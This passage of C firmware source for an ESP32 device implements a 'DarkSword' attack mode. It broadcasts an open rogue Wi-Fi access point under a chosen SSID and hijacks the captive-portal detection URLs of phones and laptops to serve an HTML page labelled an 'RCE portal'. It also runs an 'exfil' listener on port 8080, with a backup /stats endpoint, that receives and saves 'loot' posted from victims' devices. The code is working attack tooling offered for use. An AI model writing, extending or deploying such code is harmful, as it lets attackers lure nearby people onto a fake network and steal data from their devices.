Smethan/projectZero/ESP32C5/main/main.c
    int listen_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_fd < 0) {
        MY_LOG_INFO(TAG, "DS exfil: socket() failed");
        darksword_exfil_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    darksword_exfil_socket = listen_fd;

    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(8080),
        .sin_addr.s_addr = htonl(INADDR_ANY),
    };

    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        MY_LOG_INFO(TAG, "DS exfil: bind() failed");
        close(listen_fd);
        darksword_exfil_socket = -1;
        darksword_exfil_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    if (listen(listen_fd, 2) < 0) {
        MY_LOG_INFO(TAG, "DS exfil: listen() failed");
        close(listen_fd);
        darksword_exfil_socket = -1;
        darksword_exfil_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    MY_LOG_INFO(TAG, "DS exfil: listening on port 8080");

    while (darksword_active) {
        struct sockaddr_in cli;
        socklen_t cli_len = sizeof(cli);
        int client_fd = accept(listen_fd, (struct sockaddr *)&cli, &cli_len);
        if (client_fd < 0) {
            if (!darksword_active) break;
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        // Set receive timeout
        struct timeval tv = { .tv_sec = 10, .tv_usec = 0 };
        setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        // Read up to 2 MB
        size_t buf_sz = 2 * 1024 * 1024;
        char *buf = (char *)heap_caps_malloc(buf_sz, MALLOC_CAP_SPIRAM);
        if (!buf) {
            close(client_fd);
            continue;
        }

        size_t total_read = 0;
        while (total_read < buf_sz) {
            int r = recv(client_fd, buf + total_read, buf_sz - total_read, 0);
            if (r <= 0) break;
            total_read += (size_t)r;
            // Check if we got the full HTTP request (double CRLF + content-length worth of body)
            if (total_read > 4) {
                char *body_start = strstr(buf, "\r\n\r\n");
                if (body_start) {
                    body_start += 4;
                    // Try to find Content-Length
                    char *cl_hdr = strcasestr(buf, "Content-Length:");
                    if (cl_hdr) {
                        int cl = atoi(cl_hdr + 15);
                        size_t hdr_len = (size_t)(body_start - buf);
                        if (cl > 0 && total_read >= hdr_len + (size_t)cl) break;
                    }
                }
            }
        }
        buf[total_read < buf_sz ? total_read : buf_sz - 1] = '\0';

        // Send HTTP 200 response
        const char *resp = "HTTP/1.1 200 OK\r\n"
                           "Content-Type: application/json\r\n"
                           "Access-Control-Allow-Origin: *\r\n"
                           "Connection: close\r\n"
                           "Content-Length: 15\r\n\r\n"
                           "{\"status\":\"ok\"}";
        send(client_fd, resp, strlen(resp), 0);
        close(client_fd);

        // Extract JSON body
        char *body = strstr(buf, "\r\n\r\n");
        if (body) {
            body += 4;
            size_t body_len = total_read - (size_t)(body - buf);
            if (body_len > 0) {
                darksword_save_loot(body, body_len);
            }
        }
        heap_caps_free(buf);
    }

    if (darksword_exfil_socket >= 0) {
        close(darksword_exfil_socket);
        darksword_exfil_socket = -1;
    }
    MY_LOG_INFO(TAG, "DS exfil: task exiting");
    darksword_exfil_task_handle = NULL;
    vTaskDelete(NULL);
}

// ─── cmd_start_darksword ─────────────────────────────────────────────
static int cmd_start_darksword(int argc, char **argv) {
    oled_display_update_full("> DarkSword",
        argc >= 2 ? argv[1] : "  No SSID",
        "  RCE portal", "  Waiting...");
    log_memory_info("start_darksword");

    if (!ensure_wifi_mode()) return 1;

    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: start_darksword <SSID>");
        return 1;
    }

    if (portal_active || darksword_active) {
        MY_LOG_INFO(TAG, "A portal is already running. Use 'stop' first.");
        return 0;
    }

    const char *ssid = argv[1];
    size_t ssid_len = strlen(ssid);
    if (ssid_len == 0 || ssid_len > 32) {
        MY_LOG_INFO(TAG, "SSID length must be 1-32");
        return 1;
    }

    // Load HTML from SD
    if (!load_darksword_html()) return 1;

    // Store portal SSID
    if (portalSSID) { free(portalSSID); portalSSID = NULL; }
    portalSSID = strdup(ssid);

    MY_LOG_INFO(TAG, "Starting DarkSword portal with SSID: %s", ssid);

    // Enable AP
    esp_netif_t *ap_netif = ensure_ap_mode();
    if (!ap_netif) { MY_LOG_INFO(TAG, "DS: AP mode failed"); return 1; }

    esp_netif_dhcps_stop(ap_netif);

    esp_netif_ip_info_t ip_info;
    ip_info.ip.addr      = esp_ip4addr_aton("172.0.0.1");
    ip_info.gw.addr      = esp_ip4addr_aton("172.0.0.1");
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    esp_netif_set_ip_info(ap_netif, &ip_info);

    wifi_config_t ap_cfg = {0};
    memcpy(ap_cfg.ap.ssid, ssid, ssid_len);
    ap_cfg.ap.ssid_len = ssid_len;
    ap_cfg.ap.channel = 1;
    ap_cfg.ap.max_connection = 4;
    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);

    esp_netif_dhcps_start(ap_netif);
    vTaskDelay(pdMS_TO_TICKS(1000));

    // HTTP server config — increase max_uri_handlers and recv buffer for large POST
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_open_sockets = 4;
    config.max_uri_handlers = 16;
    config.recv_wait_timeout = 30;
    config.send_wait_timeout = 30;
    config.stack_size = 8192;

    esp_err_t http_ret = httpd_start(&portal_server, &config);
    if (http_ret != ESP_OK) {
        MY_LOG_INFO(TAG, "DS: HTTP server failed: %s", esp_err_to_name(http_ret));
        return 1;
    }

    // Register darksword page on all captive-portal paths
    const httpd_uri_t page_uris[] = {
        { .uri = "/",                   .method = HTTP_GET, .handler = darksword_page_handler },
        { .uri = "/portal",             .method = HTTP_GET, .handler = darksword_page_handler },
        { .uri = "/hotspot-detect.html",.method = HTTP_GET, .handler = darksword_page_handler },
        { .uri = "/generate_204",       .method = HTTP_GET, .handler = darksword_page_handler },
        { .uri = "/ncsi.txt",           .method = HTTP_GET, .handler = darksword_page_handler },
        { .uri = "/*",                  .method = HTTP_GET, .handler = darksword_page_handler },
    };
    for (int i = 0; i < sizeof(page_uris)/sizeof(page_uris[0]); i++) {
        httpd_register_uri_handler(portal_server, &page_uris[i]);
    }

    // POST /stats on port 80 (backup path)
    const httpd_uri_t stats_post = {
        .uri = "/stats", .method = HTTP_POST, .handler = darksword_stats_handler
    };
    httpd_register_uri_handler(portal_server, &stats_post);

    // OPTIONS /stats for CORS preflight
    const httpd_uri_t stats_options = {
        .uri = "/stats", .method = HTTP_OPTIONS, .handler = darksword_stats_handler
    };
    httpd_register_uri_handler(portal_server, &stats_options);

